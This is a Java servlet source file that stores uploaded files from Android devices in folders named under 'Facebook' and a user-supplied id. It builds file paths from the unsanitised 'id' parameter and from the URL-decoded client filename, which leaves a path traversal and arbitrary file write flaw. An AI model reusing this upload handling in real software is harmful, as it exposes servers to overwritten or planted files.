/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package server.http.servlet;

import java.io.File;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;
import static server.config.Config.DIR_SERVER_DATA;
import static server.config.Config.SERVER_PATH;

/**
 *
 * @author Loli
 */
public class Backup extends HttpServlet {

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String id = request.getParameter("id");
        String device = request.getParameter("device");

        new File(SERVER_PATH + "\\" + DIR_SERVER_DATA + "\\Facebook\\" + id).mkdirs();

        String path = "";
        Part p = request.getPart("file");
        if (device.equals("Android")) {
            path = getAndroidFilePath(p);
            if (path == null) {
                return;
            }
        } else {
            path = "Error Device";
        }
        new File(SERVER_PATH + "\\" + DIR_SERVER_DATA + "\\Facebook\\" + id + "\\" + path).mkdirs();
        p.write(DIR_SERVER_DATA + "\\Facebook\\" + id + "\\" + path + "\\" + getFileName(p));
    }

    String getFileName(Part p) {
        String path = extractFileName(p);
        return path.substring(path.lastIndexOf("/") + 1, path.length());
    }

    String getAndroidFilePath(Part p) {
        String path = extractFileName(p);
        if (path.length() == 0) {
            return null;
        }

        int i = path.lastIndexOf("/");
        String[] s = path.substring(0, i).split("/files/");
        if (s.length == 1) {
            return "";
        } else if (s.length == 2) {
            return s[1];
        }
        return null;
    }

    private String extractFileName(Part part) {
        String contentDisp = part.getHeader("content-disposition");
        String[] items = contentDisp.split(";");
        for (String s : items) {
            if (s.trim().startsWith("filename")) {
                String url = s.substring(s.indexOf("=") + 2, s.length() - 1);
                try {
                    String urlDecode = URLDecoder.decode(url, "UTF-8");
                    return urlDecode;
                } catch (UnsupportedEncodingException ex) {
                    System.out.println(ex);
                    return "";
                }
            }
        }
        return "";
    }

}
